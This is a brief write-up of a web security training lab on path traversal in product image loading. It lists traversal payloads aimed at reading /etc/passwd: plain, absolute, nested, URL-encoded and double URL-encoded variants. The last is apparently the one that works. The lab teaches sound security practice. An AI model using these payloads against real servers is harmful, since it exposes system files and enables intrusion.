# Lab 04 : File path traversal, traversal sequences stripped with superfluous URL-decode

## Overview:
- Level : PRACTITIONER
- path traversal vulnerability in the display of product images
- End goal: retrieve the contents of the /etc/passwd file.

## Solution:
- ../../../etc/passwd doesn't work
- use absolute path
    /etc/passwd 
    doesn't work
- ....//....//....//etc//passwd doesn't work

- url encode ../../../etc/passwd
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    doesn't work

- double url encode ../../../etc/passwd
    %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34